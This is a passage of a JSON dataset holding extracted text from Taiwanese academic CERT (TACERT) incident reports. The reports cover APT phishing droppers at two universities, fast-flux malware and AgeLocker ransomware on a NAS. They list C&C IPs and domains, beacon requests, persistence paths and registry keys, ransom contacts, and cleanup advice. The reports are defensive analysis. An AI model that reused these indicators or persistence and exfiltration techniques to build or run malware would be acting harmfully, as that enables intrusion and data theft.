        "content": "JAVA\\ JavaQuick.exe 2. 使用Virustotal 進行線上掃描的檢出比例只有2 / 47 約4.3%,故大多防毒 Internet Office PC Outside Mail Server Hacker School Mail Server Malicious Attachment Malicious Attachment 88.33.217.272:80 Italy 1.177.211.126:443 Korea (C&C) STEP 1.1 STEP 2.1 STEP 2.2 GET STEP 2.4 POST STEP 1.2 STEP 1.3 STEP 1.4 STEP 2.3 58.212.109.163 61.164.51.196 222.95.186.102 STEP 3 Netbios Name Query STEP 1.1-1.4 : 駭客傳送惡意郵件至該校的職員。 STEP 2.1 : Office PC 若開啟郵件附檔遭受感染開始對外連線。 STEP 2.2 : Office PC 向 88.33.217.272 做感染報到。 STEP 2.3 : 88.33.217.272 可能會向 1.177.211.126 交換感染主機資訊。 STEP 2.4 : Office PC 開始向1.177.211.126 (C&C)傳送電腦的加密資料。 STEP 3 : Office PC 成為駭客工具向其他電腦做 Netbios 的掃描。  3 軟體不會察覺有異。 圖1、procexp 檢測結果 3. 待JavaQuick.exe 執行後,同時會寫入註冊機碼中以便開機時後自動啟 動。 (1). Win7(x86)測試並不會寫入註冊機碼中開機自動啟動。 圖2、autoruns 檢測註冊機碼 JavaQuick 於開機時自動啟動 (2). scr 惡意程式會產生JavaQuick.exe,另外會產生ka4281x3.log,但很快 就會被移除,故內容不明。 圖3、procmon 程序監控得知該JavaQuick.exe 產生方式 4. 待JavaQuick.exe 於背景執行後,會在C:\\Documents and Settings\\User\\Local  4 Setting\\Temp 底下建立並開啟一個名為『~gth74l.doc』的檔案,讓人誤以 為是真的word 檔。 註:Win7 的路徑為C:\\Users\\user\\AppData\\Local\\Temp\\~gth74l.doc。 圖4、procmon 觀察scr ",
        "Page_Num": "3,4,5"
    },
    "158": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
        "content": "惡意程式產生且開啟『~gth74l.doc』 5. 透過觀察發現此JavaQuick.exe 會用本地的隨機埠連到遠端主機 88.33.217.272 的Port 80 進行資料傳送,追查此IP 國家位於義大利。 (1). 側錄封包重建後,感染主機會GET /docs/index.jsp?/QRTF96.jsp?1=QPI5RJjO9KjnSwhkRwjk8MI5DmIZ3M y5S9p8AA 的資料給遠端主機88.33.217.272。 (2). 遠端主機接收成功後會回覆給感染主機內容是 ”Connect Failed” 的 html 檔。 圖5、觀察pcap 封包資訊 6. 待JavaQuick.exe 執行約17 時35 分後,背景rundll32.exe 會被惡意程式啟 動去進行對外連線動作,同時cmd.exe 為rundll32.exe 所呼叫的子程式。 (1). 惡意程式用rundll32.exe 產生ipnet.dll 向1.177.211.126:443 進行連線。 (2). C:\\windows\\temp\\ipnet.dll使用Virustotal檢測為比例20/47的惡意程式, 此dll 為駭客用來連外網路使用。 (3). 側錄封包發現傳送約1.26MB 的raw 檔案,內容經過加密無法判讀, 可能為偷取主機的個人帳密資料。  5 7. 待JavaQuick.exe 執行約17 時45 分後,跳出一個防火牆視窗詢問是否允 許『ccapp.exe』連線,解除封鎖後會於背景執行,並執行約4 分鐘後消失 就再無出現。 圖6、防火牆跳出ccapp 警示訊息 (1). 該ccapp.exe藏匿於C:\\WINDOWS\\system32\\Com\\ 下,重開機還會在。 (2). 使用Virustotal 檢查ccapp.exe 檢出比例為12/47,為變異svchost.exe。 (3). 此ccapp.exe 會向這3 個IP ",
        "Page_Num": "5,6"
    },
    "159": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
        "content": "進行netbios name query: 主要IP 為: 58.212.109.163、61.164.51.196、222.95.186.102。  6 圖7、Netbios name query 8. 揮發性記憶體(RAM) 分析工具Audit Viewer 檢測: (1). JavaQuick.exe 程序執行中紀錄的String 如下,研判1.177.211.126 為駭 客用來接收資料的跳板主機。 圖8、JavaQuick.exe → rundll32.exe 利用ipnet.dll 連到1.177.211.126:443 (2). 由JavaQuick.exe 執行rundll32.exe 並啟用的cmd.exe 行為: a. 執行中的string 紀錄,發現rundll32.exe 呼叫cmd.exe 去執行 taskkill.exe 刪除相關程序。 圖9、PID:3536 該程序被taskkill 刪除 圖10、PID:3456 其實就是ccapp.exe,該程序被taskkill 刪除 b. 執行ccapp.exe 連線至61.164.51.196:214 連線 圖11、執行ccapp.exe 去對61.164.51.196:214 連線 2013/7/16 上午 10:28:59 Added ccapp.exe TCP 0.0.0.0:80 0.0.0.0:* 2013/7/16 上午 10:29:17 Added ccapp.exe TCP 140.117.71.34:80 58.212.109.163:27285 2013/7/16 上午 10:29:17 Added ccapp.exe TCP 140.117.71.34:1261 61.164.51.196:214 2013/7/16 上午 10:29:25 Removed ccapp.exe TCP 140.117.71.34:1261 61.164.51.196:214 2013/7/16 上午 10:29:33 Removed ccapp.exe TCP 140.117.71.34:80 58.212.109.163:27285 2013/7/16 上午 10:39:38 Added ccapp.exe TCP 0.0.0.0:8012 0.0.0.0:* 2013/7/16 上午 10:39:42 Added ccapp.exe TCP 140.117.71.34:1268 61.164.51.196:214 2013/7/16 上午 10:39:42 Added ccapp.exe",
        "Page_Num": "6,7"
    },
    "160": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
        "content": "TCP 140.117.71.34:8012 222.95.186.102:6883 2013/7/16 上午 10:39:52 Removed ccapp.exe TCP 140.117.71.34:1268 61.164.51.196:214 2013/7/16 上午 10:40:20 Removed ccapp.exe TCP 0.0.0.0:80 0.0.0.0:* 2013/7/16 上午 10:40:24 Removed ccapp.exe TCP 0.0.0.0:8012 0.0.0.0:* 2013/7/16 上午 10:43:00 Removed ccapp.exe TCP 140.117.71.34:8012 222.95.186.102:6883  7 c. 疑似透過vnet32.dll 來產生ipnet.dll 圖12、疑似透過vnet32.dll 來產生ipnet.dll 9. 惡意程式排除方式 (1). 將病毒『JavaQuick.exe』手動移除 a. XP 路徑C:\\Documents and Settings\\User\\Application Data\\JAVA\\ 。 b. Win7 路徑C:\\Users\\user\\AppData\\Roaming\\JAVA\\ 。 (2). 將偽造的word 檔案『~gth74l.doc』刪除。 a. XP 路徑C:\\Documents and Settings\\User\\Local Setting\\Temp\\ 。 b. Win7 路徑C:\\Users\\user\\AppData\\Local\\Temp\\ 。 (3). 將可能產生的病毒『ccapp.exe』刪除,路徑 C:\\WINDOWS\\system32\\Com\\ 。 (4). 將可能產生的病毒『ipnet.dll』刪除,路徑為 C:\\windows\\temp\\。 (5). 利用autoruns 工具或regedit 指令將開機自動啟動JavaQuick.exe 機碼刪 除,路徑HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\。 建議措施 1. 此惡意程式容易夾帶於郵件連結或各式附檔(doc,pdf,xls,...)中,此次是偽裝 成doc 的scr 執行檔,應避免直接開啟。 2. 來路不明的檔案不要輕易開啟,可以先透過Virustotal ",
        "Page_Num": "7,8"
    },
    "161": {
        "File_Name": "個案分析-K大學APT社交工程郵件事件分析報告_10210.pdf",
        "content": "進行線上掃描。 3. 線上檢測惡意網站: (1). https://www.virustotal.com/en/ (2). http://sitecheck.sucuri.net (3). http://www.siteadvisor.com 4. 檢查主機帳密是否安全,遠端桌面連線非必要可關閉。 5. 感染惡意程式主機會被當作中繼站跳板,同時也會將自己的個人資料外 洩。 6. 時常用網路流量監看工具(netstat, tcpview, ...)是否有異常流量及Port 被啟 用,以便找出可疑的執行程式。 7. 可用程序監看工具(procexp)將該異常程式移除,可用登錄機碼工具(autoruns) 檢查開機自動執行的登錄碼有無異常。 ",
        "Page_Num": "8"
    },
    "162": {
        "File_Name": "個案分析-Multi-Functional Malware分析報告.pdf",
        "content": "個案分析- Multi-Functional Malware 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/7  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 前言 ........................................................................................ 2 Fast Flux Domain 檢舉 .......................................................... 3 Fast Flux Domain 與對應的IP .............................................. 4 網路活動 ................................................................................ 6 結論 ........................................................................................ 8  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 Fast Flux 本來是一種DNS 技術,一些流量大的網站,例如Google 或Yahoo,會將網站 迅速對應至不同的實體機器,以達到網路流量負載平衡(Network Load Balance)的目的, 以減少單個網頁伺服器故障而無法提供服務造成損失。 後來,該技術被駭客利用,用來隱藏釣魚網站或惡意程式的載點,Fast Flux 被駭客拿來 利用時,也一樣不斷地變化網域對應的實體位址,比較不一樣的是,這些被對應的機器 通常都是受害端,駭客則利用這些機器來保護其惡意網站,試圖讓惡意網站躲避偵測, 延長其存活壽命。 一般沒有經過Fast Flux 掩護的網站,網頁存取過程如圖一所示。  步驟一:客戶端在瀏覽器上輸入網站(www.example.com)URL,向網站GET 一個頁面  步驟二:當網站收到這樣的請求後,網站會根據URL Response 一個對應的頁 面 圖一 正常的網頁存取過程 相對於一般的網頁存取方式,圖二則是透過Fast Flux 技術的網頁存取,增加了Flux Agent (快速變動網域代理人)。  步驟一:客戶端向惡意網站送出請求,要GET thearmynext.info 頁面,但在這 個部份因為加入Flux Agent 的關係,使得客戶端的請求並不會直接送達惡意網 站,而是與多個Flux Agent 之一連線,傳送GET 請求給Flux Agent。  步驟二:Flux Agent 沒有實質的網站內容,純粹只是一個中繼站,但是具有流  3 Taiwan Academic",
        "Page_Num": "1,2,3,4"
    },
    "163": {
        "File_Name": "個案分析-Multi-Functional Malware分析報告.pdf",
        "content": "Network Computer emergency Response Team(TACERT) 量導向的功能,因此可以將請求導向惡意網站,由惡意網站作實質的處理。  步驟三:收到Flux Agent 送來的請求後,惡意網站Response 對應的頁面。最 後,快速變動網域代理人將Response 的頁面透過80 port 導到原本送出請求的 客戶端,完成透過Fast Flux 的互動 圖二 利用Flux Agent 存取網路資源 透過上述方法,客戶端就無法與真正的惡意網站連線,存取服務都需經由Flux Agent 負 責,當資安人員要追蹤時,也只會發現Flux Agent 的存在,實質的惡意網站則因為客戶 端沒有與它作實際連線,而被隱藏起來,透過這種方式即可躲避偵查,延長惡意網站的 壽命。 Fast Flux Domain 檢舉 國外某危機處理中心定期會發佈Fast Flux Domain 檢舉信件給對應的網路位址所在單位, 檢舉的信件如圖三(僅列出小部份),裡面列出該單位偵測到Fast Flux Domain 的時間, 以及在偵測當下對應的網路位址。被檢舉的網路位址所對應的Fast Flux Doaim 非常多樣 化,每天檢舉的Fast Flux Domain 都不同,這表示這些被偵測到的Fast Flux Domain 存 活時間低,生成快。  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖三 檢舉內容 Fast Flux Domain 與對應的IP 這些檢舉文件裡的Fast Flux Domain 與IP,有一些隸屬於學術網路,列出如表一。有一 些IP 所對應的Fast Flux Domain 有多個(例如140.xxx.145.195 與163.xxx.104.29 與 163.xx.253.86),有一些則僅有一個對應的 Domain。 Date IP Fast Flux Domain 5/2 140.xxx.145.195 [vielpor.ru][cedibvo.ru].... 5/22 163.xxx.104.29 [xequjxx.ru][ykrijxx.ru][hyjamxx.ru]..... 5",
        "Page_Num": "4,5"
    },
    "164": {
        "File_Name": "個案分析-Multi-Functional Malware分析報告.pdf",
        "content": "/22 163.xxx.139.245 [borutxx.ru].... 5/24 210.xxx.121.159 [oxcimxx.ru] 5/24 163.xx.253.86 [ebmeqbe.ru][oxcimxx.ru] 表一 與學術網路有關的IP 從上述列表裡面找出兩個IP 調查,其資料如下: • 140.xxx.145.195 – C 單位 – Win XP, General PC, no Web server – %SystemRoot%\\System32\\Temp 底下有一個名為 temp68.exe 的異常程式 • 163.xxx.139.245 – Z 高中  5 Taiwan Academic Network Computer emergency Response Team(TACERT) – Win XP, General PC, no Web server – %SystemRoot%\\System32\\Temp 底下有一個名為 temp94.exe 的異常程式 [140.xxx.145.195] 與 [163.xxx.139.245] 在 [%SystemRoot%\\System32\\Temp] 這個路徑 底下都有一個以[temp]開頭的惡意程式,分別為temp68.exe 與temp94.exe,他們都佔用 了主機的80port 與53port,且這兩個埠號上有非常大量的網路連線。 若以140.xxx.145.195 對應的vielpor.ru 為例子,在Linux 命令列下使用dig 指令,一分鐘 執行一次 #dig vielpor.ru ,在十六小時內,得出vielpor.ru 所對應,不重複的網路位址共 有1500 多個,如圖四。 圖四 vielpor.ru 對應的網路位址(僅列出一小部份) 所有在圖四中列出的IP,都可以下載到一個檔名固定(avaxxx.exe),網路行為與 [temp68.exe][temp94.exe]兩個惡意程式行為相似的惡意程式,表二列出一些下載的時間 與大小,由時間可以看出惡意程式更新速度極快,推測是為了躲避偵測而做的些微修 改。  6 Taiwan Academic Network Computer emergency Response Team(TACERT) Downloaded Date size 檔名 2012-05-22 793600 bytes avaxxx.exe 2012-05-23 814080 bytes avaxxx.exe 2012-05-24 821760 bytes avaxxx.",
        "Page_Num": "5,6,7"
    },
    "165": {
        "File_Name": "個案分析-Multi-Functional Malware分析報告.pdf",
        "content": "exe 2012-05-25 822272 bytes avaxxx.exe 2012-06-07 858112 bytes avaxxx.exe 2012-06-12 792576 bytes avaxxx.exe 表二 惡意程式列表 網路活動 觀察該惡意程式執行之後所產生的網路流量,歸納出下面的活動圖,將網路流量上出現 的節點分為ABC 三群(實驗主機具有Public IP,位於B 群): 1. A 群為第一層,在NAT 後面或是在網路上面不具有實體網路位址的主機 2. B 群為第二層,被檢舉的Fast Flux Domain 所對應的主機即為此群的主機之一 3. C 群主機網路位址變化不大,回應B 群Proxy 的請求 圖五 網路活動示意圖 B 群主機的惡意行為多樣化,以下逐一列出:  7 Taiwan Academic Network Computer emergency Response Team(TACERT) 1. HTTP Relay Proxy 2. DNS 3. Spammer 4. Fake Anti-virus 網路流量佔最多的是Proxy 傳遞資料的活動,也有一些 DNS 流量,其行為是讓其他受 害主機查詢Fast Flux Domain 對應的網路位址,如圖六。 圖六中,zypzieb.ru這個Domain短時間內被查詢了多次,每次對應的網路位址都不相同, 由此可推斷,此惡意程式在利用Fast Flux 掩蓋自身的同時,自己擔當DNS 伺服器,私 下形成自己的網絡。圖七則是Spam 的流量。 圖六 惡意程式的DNS 伺服器活動  8 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖七 SPAM 流量內容 此外,它也利用人們害怕自己電腦中毒的心理狀態,跳出假的警告視窗通知使用者主機 已經中毒,並且需要使用者付費(輸入信用卡資料)後才能清除主機上的惡意程式,使 用者輸入信用卡資料後假警告視窗便會消失,猶如病毒已經被清除。 結論 隨著網路蓬勃發展,網頁應用程式多樣化,惡意程式也漸趨複雜化,單一惡意行為的惡 意程式已不能滿足駭客的需求,前陣子出現的Stuxnet、Duqu 和Flame 三隻惡意程式, 正",
        "Page_Num": "7,8,9"
    },
    "166": {
        "File_Name": "個案分析-Multi-Functional Malware分析報告.pdf",
        "content": "代表著惡意程式的發展趨勢,它們不再進行簡單的惡意行為,取而代之的是更多功能、 更廣泛的惡意活動。 惡意程式不僅功能多樣化,傳播途徑也一樣多樣化,這次的例子並沒有找到確實的證據 來證明主機如何被感染,但avaxxx.exe 這個惡意程式下載之後的Icon 是一個防毒軟體 常看到的盾圖樣,所以推測可能是將自己偽裝成防毒軟體,讓使用者下載之後感染主 機。 ",
        "Page_Num": "9"
    },
    "167": {
        "File_Name": "個案分析-M大學遭受APT惡意郵件攻擊_10303.pdf",
        "content": "個案分析- M 大學遭受APT 惡意郵件 攻擊事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/03  1 I. 事件簡介 A. M大學某陳姓教授近期收到一封冒名合作交流組組員寄出的社 交工程郵件,其主旨為 『103 年「兩岸關係發展之新形勢與展 望」國際學術研討會』,該校資安負責人請本單位TACERT 進 行郵件惡意程式分析 B. 初步鑑測發現,其郵件內容敘述的事件為看似為真實的議會流 程,並且最後留有承辦人的聯絡姓名以及方式,這是典型的APT 社交工程郵件攻擊。 C. 郵件有二個附檔名為『103 年兩岸關係之新形勢與展望國際學 術研討會會議簡介.exe』及『103 年兩岸關係之新形勢與展望國 際學術研討會會議議程及相關場次論文發表人.exe』,雖然經過 包裝乍看為DOC 和PDF 圖示,但從副檔名能發現為EXE 執行 檔。  2 II. 事件檢測: A. 實地透過常見的作業系統Win7(x64)及Office 2010 將該信件檔 案執行,並記錄其程式行為及側錄網路封包分析。 B. 此二個檔案實為相同程式,只是名稱不同。透過線上病毒資料 庫Virustotal 掃描發現,『103 年兩岸關係之新形勢與展望國際 學術研討會會議簡介.exe』其偵測比例為18/50;而『103 年兩 岸關係之新形勢與展望國際學術研討會會議議程及相關場次論 文發表人.exe』的偵測比例為20/50,兩個都不到50%。 C. 執行『103 年兩岸關係之新形勢與展望國際學術研討會會議簡 介.exe』惡意程式後,前景並不會出現任何資訊或錯誤,反而 隱藏在背景執行並開始進行網路通訊。不知情的使用者此時才 比較會察覺上當了。 1. 檢查背景執行程序可以看到,出現一個名為 『chrome_frame_helper』的程序,藏匿於暫存隱藏資料夾內",
        "Page_Num": "1,2,3"
    },
    "168": {
        "File_Name": "個案分析-M大學遭受APT惡意郵件攻擊_10303.pdf",
        "content": ", 並且偽造成製造商Google Inc.讓人誤以為是Google 的合法 程式。  3 2. 程序建立後就會開始呼叫子程序cmd.exe執行rundll32.exe。 3. 同時會在csrss.exe 出現子程序conhost.exe,其功能描述為主 控台視窗主機,可能為駭客用來存取主機資料的程式。 4. 查看『chrome_frame_helper』的網路行為看出,該程式首先 會先連到美國的IP「65.55.57.27:80」進行報到。此IP 用瀏 覽器打開會出現Microsft 的網頁,IP 確實為Microsoft 註冊 使用,只是IP 並無網域名稱反解析,讓人懷疑是否為釣魚  4 頁面。 5. 透過惡意程式生成的資料檔可以發現,在 C:\\Users\\user\\AppData\\Local\\Temp\\ 下會有一個 『YahooCache.ini』,為惡意程式『chrome_frame_helper』執 行的組態設定檔。 a. 用Base64 將字串「d3d3LnlhaG9vZGFpbHkuYml6」解碼 後為「www.yahoodaily.biz」,IP 為「98.126.54.60」。  5 b. 用Base64 將字串「TVNNQVBJLk9DWA==」解碼後為 「MSMAPI.OCX」。 6. 子程序rundll32.exe 會去執行在temp 下的MSMAPI.OCX, 並會連到美國IP「98.126.54.60:80」,經瀏覽器測試主機是開 啟,成功開啟後會回傳“Bad request”字串。  6 7. “MSMAPI.OCX”在virustotal 被偵測出12/50 為惡意程式。 III. 事件側錄流量分析 A. 側錄封包發現,開始時『chrome_frame_helper』會向 「65.55.57.27:80」進行HTTP GET,封包解析出的HTML 為下 圖所示,確實為微軟的主機,其目的可能是觸發真正的程序 rundll32.exe 執行MSMAPI.",
        "Page_Num": "3,4,5,6,7"
    },
    "169": {
        "File_Name": "個案分析-M大學遭受APT惡意郵件攻擊_10303.pdf",
        "content": "OCX。 B. 從側錄封包發現,感染主機會一直向主機 「www.yahoodaily.biz:80」用HTTP POST 方式傳送資料,而該 主機解析出的IP 正是「98.126.54.60」,也就是透過rundll32.exe 去執行MSMAPI.OCX 的行為。 1. 研判當有主機感染時候會向「98.126.54.60」報到。  7 2. 「98.126.54.60」應該為駭客接收感染主機資料所使用。 C. 傳送出去的參數會帶有感染主機的IP 和編號和時間,傳送檔案 格式為ASP 檔。檔案內容分別為: 1. NfCommand.asp:內容為 「www.google.com.999」。 2. NfStart.asp:內容為 「   b .99931924」。 D. 感染主機會一直發送UDP 封包至「224.0.0.252:5355」,此為「連 結-本機多點傳送名稱解析(LLMNR)」協定所使用,此用途主要  8 探索收集鄰近主機的IP,類似IPv4 中的「NetBios 名稱查詢要 求」。 1. LLMNR 是定義於標題為 \"Link-local Multicast Name Resolution (LLMNR)\" (連結-本機多點傳送名稱解析 (LLMNR)) (draft-ietf-dnsext-mdns-47.txt) 之網際網路草稿中 的通訊協定,同時允許 IPv6 和 IPv4 主機為鄰接電腦執行 名稱解析,而不需設定 DNS 伺服器或 DNS 用戶端。 2. 駭客藉由感染主機去掃描同網段主機的IP,若有漏洞則可能 再被入侵。 IV. 網路行為架構圖  9 Hacker STEP 1 : 駭客向受害者發送APT惡意釣魚郵件,誘使受害者執行附件。 STEP 2 : 受害者開啟郵件檔案後會向惡意主機 65.55.57.27 進行連線報到。 STEP 3 : 感染主機持續向 www.yahoodaily.biz 透過HTTP POST傳送資料。 STEP 4 : 感染主機會透過 LLMNR",
        "Page_Num": "7,8,9,10"
    },
    "170": {
        "File_Name": "個案分析-M大學遭受APT惡意郵件攻擊_10303.pdf",
        "content": "方式Multicast UDP搜尋同網段主機的IP位址。 APT受害者 www.yahoodaily.biz (98.126.54.60) 65.55.57.27:80 224.0.0.252:5355 STEP 1 APT Mail STEP 2 HTTP GET STEP 3 HTTP POST STEP 4 LLMNR 103年兩岸關係之新形勢與展望國際學術研 討會會議簡介.exe 103年兩岸關係之新形勢與展望國際學術研 討會會議議程及相關場次論文發表人.exe 65.55.57.27:80 www.yahoodaily.biz (98.126.54.60:80 ) Multicast 224.0.0.252 HTTP GET HTTP POST LLMNR  10 V. 結論 A. 此事件明顯為APT 攻擊,並且用客製化過的電子郵件給特定使 用者,將惡意程式包裝成附加檔案,分別偽裝成WORD 檔和 PDF 檔。 B. 此惡意程式容易夾帶於郵件連結或各式附檔(doc,pdf,xls,...)中, 此次是偽裝成doc 和pdf 的exe 執行檔,應避免直接開啟。 C. 惡意程式執行後會先向特定網站報到,而後再將資料用HTTP 方式定期傳給另一台惡意主機。 D. 此惡意程式也會掃描同網段主機IP 位址,若有漏洞則可能被入 侵利用。 VI. 建議措施 A. 來路不明的檔案不要輕易開啟,可以先透過Virustotal 進行線上 掃描。 B. 務必安裝防毒軟體並定期更新,大多惡意程式都能被偵測到。 C. 檢查主機帳密是否安全,遠端桌面連線非必要可關閉。 D. 感染惡意程式主機可能會被當作中繼站跳板,同時也會將自己 的個人資料外洩。 E. 時常用網路流量監看工具(netstat, tcpview, ...)是否有異常流量 及Port 被啟用,以便找出可疑的執行程式,此例為  11 「chrome_frame_helper.dll」。 F. 可用程序監看工具(procexp)將該異常程式移除,可用登錄機碼 工具(autoruns)檢查開機",
        "Page_Num": "10,11,12"
    },
    "171": {
        "File_Name": "個案分析-M大學遭受APT惡意郵件攻擊_10303.pdf",
        "content": "自動執行的登錄碼有無異常。 ",
        "Page_Num": "12"
    },
    "172": {
        "File_Name": "個案分析-NAS感染勒索病毒AgeLocker攻擊事件分析報告_10909.pdf",
        "content": "NAS 感染勒索病毒 AgeLocker 攻擊事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年09 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 由於存取的方便性,在學術網路中儲存裝置NAS 是許多學校常用的設備。但 因其為長期不關機的連網設備,又本身儲存著大量學校資料,因此NAS 作為 被勒索的設備之機率升高。 2. 2020/9 TACERT 接獲某學校通報該校存放資料的NAS 感染勒索病毒,而且以 Web 平台登入NAS 後看到每一個資料內原先存放的檔案都消失,僅有一封勒 索通知信存在。 3. 透過FTP 傳檔軟體連線NAS 的資料夾時,可看到已被加密的檔案。 4. 由於學校無法判斷出所感染的勒索病毒名稱請求TACERT 協助,故本中心取 得學校所提供的勒索通知信與被加密的2 個檔案後進行分析。 二、事件檢測 1. 由學校所提供的截圖可得知NAS 內檔案在2020/9/12 上午12:34 至上午1:07 之間被進行加密,而且被加密的檔案最後呈現兩種副檔名1NXE4 與Z2。由 截圖也發現勒索通知信HOW_TO_RESTORE_FILES.txt 在2020/9/11 下午 10:48 曾被駭客修改過。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 查看勒索通知信內容,駭客告訴學校QNAP NAS 內的檔案已被加密,如要解 密需支付比特幣,取得支付贖金的資訊需以CCPS-NAS 為主旨寫信至 smoky@mail.uk。若駭客在24 小時內沒有回信,請學校安裝Tor 洋蔥瀏覽器, 到駭客所提供網址取得聯絡駭客的方式。在信中也提到駭客可以免費幫助學 校解開5 個小於4Mb 的檔案,也告訴學校如何購買比特幣。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. ",
        "Page_Num": "1,2,3,4"
    },
    "173": {
        "File_Name": "個案分析-NAS感染勒索病毒AgeLocker攻擊事件分析報告_10909.pdf",
        "content": "安裝Tor 瀏覽器開啟駭客所提供網址後,可看到寫信聯絡駭客的E-mail 信箱 與信件主旨CCPS-NAS 的資訊。在此事件中駭客並未直接提供贖金資訊給受 害者,而信件主旨CCPS-NAS 會告訴駭客被勒索軟體加密的設備為NAS。 4. 將學校所提供的勒索通知信與被加密的兩種檔案(1NXE4 檔案與Z2 檔案)送 至ID Ransomware (https://id-ransomware.malwarehunterteam.com/)進行勒索病 毒種類的判定。 勒索通知信與副檔名1nxe4 檔案檢測結果判定為AgeLocker 勒索病毒,而副 檔名Z2 檔案則無法檢測出其勒索病毒的類型。檢測結果也告知目前勒索病 毒AgeLocker 尚未有解密器產生,故無法將被加密的檔案解密。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 檢視學校所提供的1nxe4 檔案發現文字標題以URL:「age-encryption.org」開 始。文字標題內容如下: age-encryption.org/v1.-> X25519 8d1HK4jeURTDCR6NZLBMJiTCF2Oz5DCOELqtTZEWNxw.XeZZnFZcB7/ gpXoR7fCtYuTFyL369CYwa/EdWNXhtnU.--- GpktPo02XFKW/ ozI3qbBlINUS5fp+KHEfqWiToxPLjA  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 透過瀏覽器連線age-encryption.org 會發現在GitHub (網址: github.com/FiloSottile/age)上有一個叫Age 的介紹網頁。Age 這個檔案加密工 具是由密碼學家Filippo Valsorda 所創與開發。 7. 由文件標題內容可以看到1nxe4 檔案使用X25519 的加密法,而勒索軟體解 密專家Michael Gill",
        "Page_Num": "4,5,6"
    },
    "174": {
        "File_Name": "個案分析-NAS感染勒索病毒AgeLocker攻擊事件分析報告_10909.pdf",
        "content": "espie 曾經研究Age 後提出「Age 使用X25519、 ChaChar20-Poly1305 和HMAC-SHA256 等三種加密演算法」。由此可知該檔 案是感染AgeLocker 勒索病毒無誤。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. NAS 內有些檔案被加密成Z2 檔案,由於勒索通知信僅產生一封,故推測不 可能同一時間執行兩種勒索病毒。又加密工具Age 的加密演算法有三種,加 上Z2 檔案的加密時間與1nxe4 檔案幾乎同時,故推測會造成此現象有可能勒 索病毒AgeLocker 有設定達到某種條件時則使用某一種的加密演算法。 9. 根據NAS 管理者所述,經檢視NAS 的Log 紀錄發現事件發生時間點的紀錄 不存在,故無法透過Log 紀錄追蹤該時段連線NAS 的IP 資訊,推測此Log 紀錄被刪除疑似駭客為抹除自己的足跡所為。 三、事件攻擊行為示意圖 1. 駭客從NAS 的WEB 介面駭入NAS。 2. 執行勒索病毒AgeLocker 來加密檔案。 3. 檔案加密完成後,駭客在登出NAS 前刪除NAS 的Log 紀錄來消滅自己的登 入IP 資訊。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、總結與建議 1. 在2020/7 BLEEPINGCOMPUTER 網路安全專家報導新的勒索病毒 AgeLocker 使用Googler 員工所寫的Age 加密工具來加密受害者的檔案。 2. 設計AgeLocker 的駭客未使用傳統常用的加密演算法(如AES+RSA)來加 密檔案,而是使用Age 這種命令列工具來加密檔案。Age 作為一個合法的 檔案加密工具,不曾想會被當作勒索病毒的加密工具。 3. 本事件發生在2020/09/12 凌晨駭客駭入NAS 執行勒索病毒,導致NAS 內的檔案被加密且加密後被隱藏,而受害者只看到勒索通知信的資訊,容 易造成受害者的恐慌",
        "Page_Num": "6,7,8"
    },
    "175": {
        "File_Name": "個案分析-NAS感染勒索病毒AgeLocker攻擊事件分析報告_10909.pdf",
        "content": "。 4. 本次事件學校所使用的NAS 開放校內外任意IP 連線存取NAS 內檔案, 未進行連線來源IP 的控管,降低駭客攻擊的困難度。 5. 該NAS 設備讓資料夾如同網路磁碟機一般掛載於教師所用主機內,當教 師主機感染病毒時,則NAS 資料夾感染病毒的風險升高。 6. 本次事件學校所使用的NAS 廠牌QNAP 在2020/6 有資安新聞報導勒索軟 體以QNAP 的NAS 裝置為攻擊目標,而在2020/7 Help Net Security 報導 62000 台QNAP NAS 裝置感染勒索病毒QSnatch,建議使用者定期更新與 修補QNAP NAS 設備的漏洞,以降低被駭客駭入的風險。 7. 透過NAS 設備來存取檔案雖然方便,但一旦感染勒索病毒則解密檔案的 機率很低,因此建議使用者定期異地備份NAS 內重要的資料。 8. 勒索病毒AgeLocker 目前尚未有解密器產生,對於已被加密的重要檔案建 議使用者可備份檔案,以待未來有解密器產生時進行解密。 9. 針對NAS 設備的管理與安全防護建議如下: (1) 定期更新NAS 的應用軟體與韌體。 (2) 加強管理者的密碼強度。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 啟用網路存取的保護機制來避免帳號被暴力攻擊。 (4) 若無使用SSH 與Telnet 服務的需求建議停用這些服務。 (5) 在存取Web 平台方面避免使用預設的port (如443port 或8080port)。 (6) 若NAS 有快照功能可啟用它進行資料備份。 (7) 如非必要盡量避免掛載NAS 資料夾於使用者主機上。 (8) 對於連線NAS 的來源IP 進行控管。 ",
        "Page_Num": "8,9"
    },
    "176": {
        "File_Name": "個案分析-Neutrino 的殭屍主機與C&C伺服器事件分析報告_10601.pdf",
